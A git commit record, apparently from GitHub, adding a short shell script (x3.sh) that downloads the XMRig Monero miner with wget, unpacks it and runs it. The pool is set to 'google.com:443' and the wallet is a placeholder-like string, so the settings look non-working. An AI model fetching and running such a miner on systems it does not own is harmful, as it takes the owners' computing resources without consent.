e8671b8d7e2fe65e3d8afd58fabe9ceab7b80a25
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 13:58:51 -0300

    Update and rename srb.sh to x3.sh

---
+++ x3.sh
@@ -0,0 +1,5 @@
+# xmrig
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
+tar -xf xmrig-6.18.1-linux-x64.tar.gz
+cd xmrig-6.18.1
+./xmrig --coin=XMR -o google.com:443 -u ADLSAKDLASKDLFJALDKASLDKADL.15direto -p x -t 2
